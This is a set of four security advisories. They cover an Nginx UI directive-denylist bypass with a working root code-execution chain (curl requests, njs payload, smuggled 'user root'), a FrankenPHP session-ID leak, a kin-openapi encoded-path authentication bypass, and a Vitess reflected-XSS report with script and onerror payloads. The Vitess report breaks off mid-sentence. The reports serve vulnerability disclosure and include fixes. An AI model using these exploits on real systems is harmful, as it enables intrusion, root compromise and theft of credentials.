summary: Nginx UI: nginx config directive denylist (ValidateConfigFile) is bypassable via same-line ";" separation → authenticated directive injection (RCE on the official image)
details:
## Summary
`config.ValidateConfigFile` is the security control that blocks dangerous nginx directives
(`js_*`, `perl_*`, `load_module` of njs/perl modules, `user root`). Its directive scanner is
bypassable: it splits the config by newlines and inspects only the FIRST token of each line, but
nginx separates directives with `;`, not newlines. Putting a benign directive first and the blocked
directive after a `;` on the SAME line defeats every check. The `include` directive is also not on
the denylist. As a result, an authenticated caller can inject the exact directives the hardening was
meant to block, through EVERY path that calls the validator — `POST /api/configs` (add), the REST
config modify endpoint (api/config/modify.go), the MCP `nginx_config_modify` tool, and the
site/stream save paths (internal/site/save.go, internal/stream/save.go). On deployments where
nginx has the njs/perl module (the official uozi/nginx-ui Docker image ships ngx_http_js_module.so),
this leads to code execution in the nginx worker; with `user root` the workers run as root.

This is distinct from the config_add gap (the MCP nginx_config_add tool not calling the validator at
all): here the validator IS called and still bypassed, so fixing config_add does not fix this.

## Root cause (internal/config/validation.go, ValidateConfigDirectives)
```go
for _, line := range bytes.Split(content, []byte("\n")) {          // splits on \n only
    trimmed := strings.TrimSpace(string(line))
    ...
    directive := firstDirectiveToken(trimmed)                      // first [a-zA-Z_]* of the line
    if directive == "user" && configuresRootWorkers(trimmed) { ... }     // keyed on first token
    if directive == "load_module" && loadsRestrictedDynamicModule(...) { ... } // keyed on first token
    if _, blocked := blockedConfigDirectives[directive]; blocked { ... }      // keyed on first token
}
```
nginx parses `a 1; b 2;` on one line as two directives, but this scanner only ever sees `a`.
`include` is absent from `blockedConfigDirectives`.

## Proof of Concept (live, official image uozi/nginx-ui:2.3.11) — VALIDATED paths only
Authenticated with a node secret (`X-Node-Secret`, from nginx-ui's first-boot log) or a user JWT.
Every step below hits a path that calls ValidateConfigFile.

1) Baseline — validator works on a plain line:
```
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"x.conf","base_dir":"","content":"js_import a.js;","overwrite":true}'
# -> 40017 "file content contains restricted nginx directive: js_import"   (REJECTED)
```

2) Create the njs module file via the VALIDATED REST add (JS source is not nginx directives, so it
   passes ValidateConfigContent):
```
poc.conf:
  import fs from 'fs';
  function pwn(r){ fs.writeFileSync('/tmp/NJS_VIA_DENYLIST_BYPASS.txt','denylist-bypass-rce-ok\n'); r.return(200,'pwned2\n'); }
  export default { pwn };
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"poc.conf","base_dir":"","content":"<the JS above>","overwrite":true}'   # ACCEPTED
```

3) Overwrite the main nginx.conf via the VALIDATED `nginx_config_modify` MCP tool, smuggling each
   blocked directive after a benign one on the SAME line (this is ACCEPTED by ValidateConfigFile):
```nginx
worker_processes 1; load_module /usr/lib/nginx/modules/ngx_http_js_module.so;
error_log /var/log/nginx/error.log notice; user root;
pid /run/nginx.pid;
events { worker_connections 1024; }
http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream; js_import poc from /etc/nginx/poc.conf;
    server { listen 8897; location = /pwn3 { js_content poc.pwn; } }
}
```

4) Reload. Result:
- `nginx -t` successful.
- worker `/proc/<pid>/status` → `Uid: 0 0 0 0` (root) — the blocked `user root` took effect.
- `GET http://127.0.0.1:8897/pwn3` → `pwned2` — js_content executed.
- `/tmp/NJS_VIA_DENYLIST_BYPASS.txt` created, owned by root → njs code execution as root.

(An MCP-over-SSE client for steps using nginx_config_modify is included in the config_add report as
`poc_mcp_client.py`; the same client drives this PoC. `X-Node-Secret` authenticates both REST and MCP.)

## Impact
Authenticated config-injection that defeats the directive-validation control on all guarded write
paths. On deployments with njs/perl available (the official Docker image ships ngx_http_js_module.so):
code execution in the nginx worker and, via `user root`, arbitrary file read/write as root (trivially
escalated to full host compromise). On stock nginx without those modules: reliable DoS (failed
reload) plus `user root` privilege regression.

## Honest scope / caveats
- Authenticated (node secret or user JWT), agent-mediated — not unauthenticated.
- What was live-verified: the bypass + full RCE on `POST /api/configs` (add) and the MCP
  `nginx_config_modify` tool. The other callers — REST config modify (api/config/modify.go), site
  save (internal/site/save.go), stream save (internal/stream/save.go) — invoke the SAME
  `ValidateConfigFile` (code-confirmed), so they are affected by construction; I did not individually
  live-test each.
- RCE is conditional on the njs/perl module being present; it ships in the official image, so the
  default Docker deployment is exploitable. On stock nginx without those modules the injected
  `load_module`/`js_*` make reload fail → DoS plus a `user root` privilege regression (inferred from
  nginx module behavior; not separately tested on a stock build).
- The `;` and `include` bypasses are fully confirmed live. A backslash line-continuation variant was
  accepted by the validator but its nginx parsing was not separately confirmed and is not relied on.
- "Full host compromise" describes the capability of root file read/write via njs `fs` (proven: a
  root-owned file was written); the subsequent authorized_keys/cron step is a well-known escalation,
  not something this PoC executed.

## Suggested fix
Do not hand-roll a newline/first-token denylist. Validate the way nginx parses: split statements on
`;` (and handle blocks, comments, line continuations), validate EVERY statement, block/limit
`include`, and recurse into included files — or validate via an allowlist and/or by running
`nginx -t` on the candidate before activating it.

## Dedup / novelty
Distinct from CVE-2026-33032 (unauthenticated MCP endpoint — an auth issue, now fixed) and from the
separately reported config_add validation gap (a missing validator call on one path). This is a
bypass of the validator itself, affecting every path that calls it; no existing CVE/GHSA covers it
(checked osv.dev and the GitHub advisory database for this repo). Appears novel.

summary: FrankenPHP: Cross-request PHP session ID leak in worker mode when the session extension is a shared module
details:
## Summary
In worker mode under concurrency, FrankenPHP can hand a PHP session id from one request to another when PHP's `session` extension is loaded as a shared module instead of being statically linked into the FrankenPHP binary. A request presenting `Cookie: session=A` can have `session_id()` resolve to `B` (a different concurrent client's id) or to a stale id from a previous request served by the same worker thread.

## Impact
- **Security:** cross-user session exposure / session hijacking in worker mode. Same impact class as CVE-2026-24894.
- **Functional:** users are intermittently logged out; their cookie's session is ignored and they receive a foreign or empty session.

## Affected / not affected
Exposure is determined by how the `session` extension is linked in the PHP build FrankenPHP is compiled against, **not** by the FrankenPHP release:

- **Affected:** any build where the `session` extension is not visible to FrankenPHP at compile time, i.e. loaded as a shared / out-of-tree module (`extension=session` in an ini). This includes the RPM and Debian packages and other packaged `php-zts` distributions that ship `session` as a shared extension under `conf.d`.
- **Not affected:** builds where `session` is statically compiled into the PHP that FrankenPHP links against, such as the official static binaries and Docker images. There, the reset code below is compiled in and clears the id every request.

The C session-reset code is unchanged across 1.11.x-1.12.x, so this is not a code regression between releases. A "1.12.2 works / 1.12.3 leaks" observation on the same host reflects two differently-built packages, not a source change. The persistent-zval helpers (#2366) are compiled only under `FRANKENPHP_TEST` and are unrelated.

## Root cause
FrankenPHP resets per-request session state in `frankenphp_reset_session_state()`, which releases `PS(id)` so the next `session_start()` re-reads the request cookie. That whole function is guarded by `#ifdef HAVE_PHP_SESSION`, a macro defined only when the session extension headers are present at FrankenPHP compile time (session statically enabled in the PHP build). When `session` is a shared module, `HAVE_PHP_SESSION` is undefined, the reset is compiled out, and `PS(id)` survives the request boundary.

PHP's `session_start()` reads the request cookie only when `PS(id)` is `NULL` (`ext/session/session.c`, `try_find_session_id_in_cookies()`: `if (!PS(use_cookies) || PS(id)) return;`). With a stale `PS(id)`, the cookie is ignored and the worker reuses the previous request's id, exposing it to whichever client is served next.

## Reproduction
Minimal worker script (`index.php`):
```php
<?php
$handler = static function () {
    session_start();
    $sent = $_COOKIE['session'] ?? '(none)';
    $id   = session_id();
    header('Content-Type: text/plain');
    echo ($sent === '(none)' || $sent === $id) ? "OK   sent=$sent id=$id\n"
                                               : "LEAK sent=$sent id=$id\n";
    session_write_close();
};
while (\frankenphp_handle_request($handler)) {}
```
Run under worker mode with `num 2` (≥2 workers), `session.use_strict_mode=1`, on a PHP build where `session` is a shared module. Pre-create two valid sessions `A` and `B`, then fire concurrent requests alternating the two cookies:
```sh
seq 600 | xargs -P32 -I{} sh -c '
  c=$([ $(( {} % 2 )) -eq 0 ] && echo A || echo B);
  curl -s -H "Cookie: session=$c" http://127.0.0.1:8080/' | grep -c LEAK
```
On an affected build a large fraction of responses are `LEAK` (`session_id()` differs from the cookie sent, and `A` and `B` sometimes resolve to the same id). On a statically-linked build the count is always `0`.

## Fix
When `HAVE_PHP_SESSION` is undefined, FrankenPHP now resets the `session` module through the module registry on every worker request (its `RSHUTDOWN` releases `PS(id)`, `RINIT` re-initialises the globals), so the per-request cleanup always runs regardless of how the extension is linked. Statically-linked builds are unchanged and keep using `frankenphp_reset_session_state()`.

Verified on PHP 8.6-dev ZTS, 2 workers, `session.use_strict_mode=1`, 600 alternating-cookie concurrent requests: before the fix 519/600 leaked; after the fix 0/600. Statically-linked builds stayed at 0/600.

## Workarounds
- Use a FrankenPHP build with `session` statically compiled (official static binaries or Docker images).
- Or, in the worker loop, after `session_write_close()` call `session_id('')` so the next `session_start()` re-reads the request cookie (with `session.use_strict_mode=1`).

summary: kin-openapi: ValidationHandler security-requirement bypass via encoded-path operation confusion
details:
## Summary

`openapi3filter.ValidationHandler.Middleware` validates requests with kin-openapi's
legacy router, which selects an OpenAPI operation from the decoded `URL.Path`. The
method is documented as implementing `gorilla/mux.MiddlewareFunc`, but a downstream
gorilla/mux router configured with `UseEncodedPath()` selects its handler from the
encoded representation (`URL.RawPath`).

An unauthenticated request such as `/public%2Fstatus` can therefore be validated as an
intentionally public operation (`/public/status`) and then dispatched to a protected
operation (`/{id}`). The configured, rejecting `AuthenticationFunc` is never invoked,
and the protected downstream handler runs.

This is distinct from GHSA-r277-6w6q-xmqw. The behavior below uses an explicit
authentication callback that rejects missing credentials and remains reproducible
after the v0.144.0 fix for the unsafe default callback.

## Affected products

- Product: `github.com/getkin/kin-openapi`
- Component: `openapi3filter.ValidationHandler.Middleware`
- Confirmed post-GHSA affected releases: v0.144.0, v0.145.0, and v0.146.0
- Reporter attestation: each listed release was checked out separately, the attached
  single-file test was copied into `openapi3filter/`, and that test passed; maintainers
  should independently confirm the version range
- Confirmed affected development revision: `d33e44e67734dcde81b576582185e1343fb3985d`
- v0.143.0 also reproduces this mechanism, but GHSA-r277-6w6q-xmqw already provides a
  simpler bypass on that release; the distinct post-fix claim starts at v0.144.0
- Earlier releases: not tested; please treat the introduction boundary as unknown

## Security impact

An unauthenticated remote requester can reach a handler whose OpenAPI operation
requires authentication when all of the following are true:

1. the application uses `ValidationHandler.Middleware` as the security gate;
2. the downstream router preserves and interprets an encoded path, such as
   gorilla/mux with `UseEncodedPath()`;
3. a public exact route and a protected parameterized route overlap after decoding;
4. the public and protected operations expose the same HTTP method;
5. the protected handler relies on the validation layer's security decision.

The protected operation's path-parameter value is constrained: it is an encoded
representation that decodes to a public literal path (`public%2Fstatus` in this PoC),
not an arbitrary attacker-selected identifier. A protected operation without a
compatible parameterized path is not reachable through this specific mechanism.

- Primitive: the security decision is made for a different OpenAPI operation than the
  operation dispatched by the application router.
- Demonstrated impact: a protected handler executes while the explicitly rejecting
  `AuthenticationFunc` is never invoked.
- Impact ceiling: confidentiality or integrity loss when the reachable protected
  handler has that authority; the PoC does not demonstrate data disclosure or state
  modification.
- Availability impact: not demonstrated.

## Root cause

At the confirmed development revision:

- `openapi3filter/validation_handler.go`: `ValidationHandler.Load` constructs
  `routers/legacy.NewRouter` unconditionally.
- `routers/legacy/router.go`: route selection uses the decoded request path.
- `routers/gorillamux/router.go`: the kin-openapi gorilla router constructs a
  gorilla/mux router with `UseEncodedPath()`.
- `ValidationHandler.Middleware` forwards the unchanged request after validation.

The component making the authentication decision and the component dispatching the
handler can therefore disagree about the selected operation.

## Reproduction

The attached PoC uses a real `net/http` server, an explicit API-key callback that
rejects missing credentials, and a downstream gorilla/mux router with
`UseEncodedPath()`.

From a kin-openapi checkout, copy the self-contained attachment
`encoded_path_route_confusion_test.go.txt` into `openapi3filter/` as
`encoded_path_route_confusion_test.go`, then run:

```sh
go test -v ./openapi3filter -run '^TestEncodedPathAuthorizationBypass$' -count=1
```

Expected attack observation:

```text
status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
wiring=Router.Use status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
```

Controls included in the test show that:

- `/ordinary` selects the protected operation, invokes authentication once, and is
  rejected with HTTP 401;
- `/public/status` reaches only the intentionally public handler;
- the encoded request reaches the protected `/{id}` handler with HTTP 202 while the
  authentication callback remains uncalled;
- both external wrapping and the documented
  `router.Use(validationHandler.Middleware)` wiring reproduce the same result.

## Reverse-proxy reachability

The same request was reproduced through Nginx 1.31.3 using the official
`nginx:alpine` image digest
`sha256:4a73073bd557c65b759505da037898b61f1be6cbcc3c2c3aeac22d2a470c1752`.

The exact container invocation was:

```sh
docker run --rm --name kin-openapi-nginx \
  --add-host=host.docker.internal:host-gateway \
  -p 18081:8080 -p 18082:8081 \
  -v "$PWD/poc/nginx.conf:/etc/nginx/nginx.conf:ro" \
  nginx:alpine
```

Container port 8080 uses `proxy_pass http://host.docker.internal:18080;` without a
replacement URI. Host port 18081 therefore preserved `/public%2Fstatus`; the protected
handler returned HTTP 202 and the
authentication callback remained at zero calls. With
`proxy_pass http://host.docker.internal:18080/;` on container port 8081 / host port
18082, Nginx canonicalized the upstream URI; both layers selected `/public/status` and
the bypass did not occur.

Nginx access-log observations:

```text
server_port=8080 "GET /public%2Fstatus HTTP/1.1" 202 0 "curl/8.7.1"
server_port=8081 "GET /public%2Fstatus HTTP/1.1" 204 0 "curl/8.7.1"
server_port=8080 "GET /ordinary HTTP/1.1" 401 0 "curl/8.7.1"
```

The response route headers were `X-Poc-Route: /{id}` on the preserving listener and
`X-Poc-Route: /public/status` on the canonicalizing listener. Backend observations for
the two requests were:

```text
request_uri="/public%2Fstatus" path="/public/status" raw_path="/public%2Fstatus" auth_before=0
completed request_uri="/public%2Fstatus" auth_after=0
request_uri="/public/status" path="/public/status" raw_path="" auth_before=0
completed request_uri="/public/status" auth_after=0
```

This control shows that upstream path handling is a deployment precondition rather
than claiming that every proxy configuration is affected.

The canonical protected control produced:

```text
request_uri="/ordinary" path="/ordinary" raw_path="" auth_before=0
completed request_uri="/ordinary" auth_after=1
```

## Suggested remediation

The authentication layer and downstream dispatcher must select the same OpenAPI
operation from the same request representation.

Potential approaches:

1. make `ValidationHandler` accept a caller-supplied `routers.Router` and require it to
   match downstream routing semantics;
2. document that `NewValidator` already accepts a router but is safe only when the
   supplied router selects operations using the same semantics as the dispatcher;
   callers must also supply an `AuthenticationFunc` through `ValidationOptions`, or
   protected requests fail with the existing missing-authentication-service error;
3. as an interim hardening option, make `ValidationHandler` fail closed on an encoded
   path separator when `URL.Path` and `URL.RawPath` can select different operations,
   and verify this behavior against the full suite;
4. document the route-identity requirement and add encoded-separator regression tests.

Replacing the legacy router with the kin-openapi gorilla router closes this PoC, but a
local compatibility check changed two existing missing-path-parameter tests from HTTP
400 semantics to route-not-found HTTP 404 semantics. A direct router swap is therefore
not a fully validated drop-in fix.

## Public-reference triage

The public advisory list and related path-encoding reports reviewed on 2026-08-18 did
not describe this authentication-boundary crossing. Relevant nearby reports include
issues #397, #1089, and #1105 and PR #400. This search is not proof of novelty; please
deduplicate against private reports.

## Credit

summary: Vitess vttablet /twopcz reflected XSS
details:
From: xylove21 To: security@vitess.io Subject: [Security Report] Vitess vttablet /twopcz reflected XSS Date: Tue, 24 Jun 2026 14:30:00 +0800 ## Summary The `twopczHandler` in `go/vt/vttablet/tabletserver/twopcz.go` (line 185) reflects the `Action` and `dtid` form values directly into the HTML response body via `fmt.Fprintln(w, msg)` — **without HTML escaping**. The response is served as `text/html; charset=utf-8`, and Vitess's default `acl` policy is **allow-all**, so the endpoint is reachable by anyone who can hit the vttablet's HTTP port (default `15999`, multiplexed with gRPC and MySQL wire-protocol ports). A crafted `Action` or `dtid` value yields a **reflected XSS** that executes in the operator's browser with same-origin access to the vttablet's debug endpoints. This includes `/queryz` (live query plans), `/querylogz` (recent queries with bound values), `/txlogz` (transactions), `/debug/env` (environment variables — may include MySQL/topology credentials), `/debug/vars` (expvar stats), and `/debug/pprof/*` if enabled. The bug was introduced before v20.0.0 (long-standing) and was silently fixed in commit `3140c1846c` (merged 2026-06-09, PR #20255, "tabletserver: escape reflected form values in twopcz handler"). The fix replaces `fmt.Fprintln(w, msg)` with `fmt.Fprintln(w, html.EscapeString(msg))`. **No released version of Vitess contains the fix** — the fix lives only on `main` (current tip `33a3c0fafe69`, 2026-06-23). There is **no CVE, GHSA, or OSV entry** for this specific bug (verified 2026-06-24 against GitHub Advisory Database, OSV.dev, and NVD). ## Impact | Field | Value | |-------|-------| | **Type** | Reflected Cross-Site Scripting (XSS) | | **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` = **7.7 HIGH** | | **Attack Vector** | Network (vttablet HTTP port 15999, multiplexed with gRPC/MySQL) | | **Attack Complexity** | Low (craft URL, send to operator) | | **Privileges Required** | None (default `acl` policy is allow-all) | | **User Interaction** | Required (operator must visit crafted URL) | | **Scope** | Changed (XSS chain reaction to other vttablet debug endpoints) | | **Confidentiality** | High (query text, env vars, expvar stats) | | **Integrity** | None (XSS itself doesn't change state) | | **Availability** | None (XSS itself doesn't disrupt service) | ### Affected versions (verified) All released versions are vulnerable. The fix lives only on `main`: | Tag | Released | `twopcz.go` line 185 | Status | |---|---|---|---| | v20.0.0 | 2024-06-27 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v20.0.1 - v20.0.6 | 2024 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v22.0.4 | 2026-02-27 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v23.0.3, v23.0.4 | 2026-02 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v24.0.0, v24.0.1 | 2026-04 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** | | **main** (`33a3c0fafe69`) | 2026-06-23 | `fmt.Fprintln(w, html.EscapeString(msg))` | **FIXED** | ### Sensitive data exposed via the same-origin XSS chain A successful XSS lands in the vttablet's origin. From there, the attacker can fetch (via `fetch()` from injected JavaScript) the following same-origin endpoints, all of which are unauthenticated by default: - `/twopcz` — in-flight 2PC transactions (query text, parameters, dtid) - `/queryz` — live query plans - `/querylogz` — recent queries with bound values - `/txlogz` — transactions - `/debug/env` — environment variables (may include MySQL creds, topology credentials, encryption keys) - `/debug/vars` — expvar stats - `/debug/pprof/*` — CPU/memory profiles (if enabled) ## Reproduction (independent, runnable PoC) The PoC is a self-contained Go HTTP server that replicates the buggy `twopczHandler` from Vitess v20.0.0 verbatim (using the same line-185 code). It runs on `127.0.0.1:15080` and returns the same response shape as the real Vitess endpoint. ```bash # 1) Build the PoC (Go 1.23+) cd /path/to/finding/CVE-pending-twopcz-xss go build -o /tmp/vitess-twopcz-poc ./poc.go # 2) Start the buggy server ADDR=127.0.0.1:15080 /tmp/vitess-twopcz-poc & # 3) Reproduce — Test 1: bare GET (no params) curl -sS -i "http://127.0.0.1:15080/twopcz" # → Content-Type: text/html; charset=utf-8, status 200 # 4) Test 2: XSS via Action param (URL-encode the script tag) curl -sS -i "http://127.0.0.1:15080/twopcz?Action=%3Cscript%3Ealert(1)%3C%2Fscript%3E&dtid=zz" # → Response body contains literal "(zz): completed." # → Browser executes the script as same-origin code # 5) Test 3: XSS via dtid param (attribute-context payload) curl -sS -i "http://127.0.0.1:15080/twopcz?Action=Demo&dtid=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" # → Response body contains literal "" # → Browser fires the onerror handler as same-origin code # 6) Run the 3x automated runner (writes evidence/run-{1,2,3}.log) bash ./poc/run.sh ``` PoC result excerpt (from `evidence/run-1.log`): ``` --- Test 2: XSS via Action= --- HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 ...

WARNING: Actions on this page can jeopardize data integrity.

(zz): completed. PASS: payload reflected UNESCAPED (XSS exploitable in browser) ``` The PoC was run 3 times on the buggy server (all 3/3 PASS) and the same code is byte-identical to the v20.0.0 commit `8aeb274f6c8e` line 185. ## Root cause (technical detail) `go/vt/vttablet/tabletserver/twopcz.go` (v20.0.0 through v24.0.1): ```go // Line 185 fmt.Fprintln(w, msg) ``` `msg` is constructed earlier in the handler as: ```go msg := fmt.Sprintf("%s(%s): completed.", action, dtid) ``` with `action` and `dtid` coming from the form values `r.FormValue("Action")` and `r.FormValue("dtid")`. The form values are URL-decoded (so a `+` becomes a space, `%3C` becomes `<`) but never HTML-escaped. The handler explicitly sets `Content-Type: text/html; charset=utf-8` (via the `` it writes first), so the browser executes any injected `
